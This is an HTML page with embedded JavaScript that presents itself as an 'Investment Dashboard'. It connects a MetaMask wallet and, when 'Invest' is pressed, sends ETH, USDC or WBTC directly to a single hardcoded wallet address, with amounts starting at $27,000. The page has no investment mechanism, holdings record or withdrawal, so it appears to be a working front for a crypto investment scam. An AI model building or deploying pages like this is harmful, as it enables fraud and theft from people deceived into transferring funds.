<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Investment Dashboard</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
:root {
    --bg-dark:#0a0f1e;
    --card-bg:#131a2c;
    --border:#1e273b;
    --primary:#00bfff;
    --secondary:#7f5af0;
    --text-main:#e0e0e0;
    --text-dim:#94a3b8;
}

*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter',sans-serif;}
body{background:var(--bg-dark);color:var(--text-main);}

.container{
    max-width:480px;
    margin:40px auto;
    background:var(--card-bg);
    border-radius:16px;
    padding:24px;
}

h2{text-align:center;margin-bottom:24px;color:var(--primary);}

.input-group{margin-bottom:18px;}

label{
    display:block;
    font-size:13px;
    color:var(--text-dim);
    margin-bottom:6px;
}

input,select{
    width:100%;
    padding:10px;
    border-radius:8px;
    border:1px solid var(--border);
    background:var(--bg-dark);
    color:white;
}

button{
    width:100%;
    padding:14px;
    margin-top:10px;
    border:none;
    border-radius:10px;
    font-weight:600;
    cursor:pointer;
}

.btn{
    background:linear-gradient(135deg,var(--primary),var(--secondary));
    color:white;
}

.disconnect{
    background:#2b2f45;
    color:white;
}

.summary{
    background:#1e293b;
    padding:16px;
    border-radius:10px;
    margin:16px 0;
    line-height:1.6;
}

.status{text-align:center;margin-top:10px;color:var(--primary);}
.wallet-info{text-align:center;font-size:12px;margin-top:10px;color:var(--text-dim);}
</style>
</head>

<body>

<div class="container">
<h2>Investment Dashboard</h2>

<div class="input-group">
<label>Asset</label>
<select id="tokenSelect" onchange="updateToken()">
<option value="ETH">ETH</option>
<option value="USDC">USDC</option>
<option value="WBTC">WBTC</option>
</select>
</div>

<div class="input-group">
<label>Amount (USD)</label>
<input type="range" min="27000" max="3000000" step="1000" value="27000"
oninput="updateAmount(this.value)">
<input type="number" id="amount" readonly>
</div>

<div class="summary">
<div>Token: <span id="summaryToken">ETH</span></div>
<div>USD: <span id="summaryAmount">27000</span></div>
<div>Coins: <span id="coinEquivalent">-</span></div>
</div>

<button class="btn" onclick="connectWallet()">Connect Wallet</button>
<button class="disconnect" onclick="disconnectWallet()">Disconnect</button>
<button id="btnDeposit" class="btn" onclick="sendDeposit()" disabled>Invest</button>

<div class="status" id="status">Ready</div>

<div class="wallet-info">
Wallet: <span id="walletDisplay">-</span><br>
Network: <span id="networkDisplay">-</span>
</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<script>
let provider, signer;
let selectedToken = "ETH";
let investUSD = 27000;

let PRICES = { ETH: 1800, USDC: 1, WBTC: 30000 };

const TOKENS = {
    USDC:{address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",decimals:6},
    WBTC:{address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",decimals:8}
};

const RECEIVER = "0x7e60e8c68965EFD8C969Fae1e0f640f890109908";

async function fetchPrices(){
    try{
        const res = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=ethereum,bitcoin&vs_currencies=usd"
        );
        const data = await res.json();

        PRICES.ETH = data.ethereum.usd;
        PRICES.WBTC = data.bitcoin.usd;

        updateCoin();
    } catch(e){
        console.log("price fetch failed", e);
    }
}

setInterval(fetchPrices, 15000);
fetchPrices();

function updateToken(){
    selectedToken = document.getElementById("tokenSelect").value;
    document.getElementById("summaryToken").innerText = selectedToken;
    updateCoin();
}

function updateAmount(v){
    investUSD = Number(v);
    document.getElementById("amount").value = investUSD;
    document.getElementById("summaryAmount").innerText = investUSD;
    updateCoin();
}

function updateCoin(){
    const price = PRICES[selectedToken];
    const coin = (investUSD / price).toFixed(selectedToken==="WBTC"?8:6);
    document.getElementById("coinEquivalent").innerText =
        `${coin}\n${selectedToken}`;
}

// CONNECT
async function connectWallet(){
    if(!window.ethereum) return alert("Install MetaMask");

    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();

    const chainId = await window.ethereum.request({ method:'eth_chainId' });
    if(chainId !== "0x1"){
        await window.ethereum.request({
            method:"wallet_switchEthereumChain",
            params:[{chainId:"0x1"}]
        });
    }

    const addr = await signer.getAddress();

    document.getElementById("walletDisplay").innerText =
        addr.slice(0,6)+"..."+addr.slice(-4);

    document.getElementById("networkDisplay").innerText="Ethereum Mainnet";

    document.getElementById("btnDeposit").disabled=false;
    document.getElementById("status").innerText="Connected";
}

function disconnectWallet(){
    signer = null;
    provider = null;

    document.getElementById("walletDisplay").innerText="-";
    document.getElementById("networkDisplay").innerText="-";
    document.getElementById("btnDeposit").disabled=true;
    document.getElementById("status").innerText="Disconnected";
}

// SEND TX
async function sendDeposit(){
    if(!signer) return;

    try{
        document.getElementById("status").innerText="Opening MetaMask...";

        let tx;

        if(selectedToken==="ETH"){
            const ethAmount = (investUSD / PRICES.ETH).toFixed(18);

            tx = await signer.sendTransaction({
                to: RECEIVER,
                value: ethers.utils.parseEther(ethAmount)
            });

        } else {

            const token = TOKENS[selectedToken];
            const price = PRICES[selectedToken];

            const raw = investUSD / price;
            const parsed = ethers.utils.parseUnits(
                raw.toFixed(token.decimals),
                token.decimals
            );

            const contract = new ethers.Contract(
                token.address,
                ["function transfer(address to,uint256 amount) returns(bool)"],
                signer
            );

            tx = await contract.transfer(RECEIVER, parsed);
        }

        document.getElementById("status").innerText="Waiting confirmation...";
        await tx.wait();

        document.getElementById("status").innerText="Success ✅";

    } catch(e){
        console.error(e);
        document.getElementById("status").innerText="Transaction failed ❌";
    }
}

updateAmount(27000);
</script>

</body>
</html>
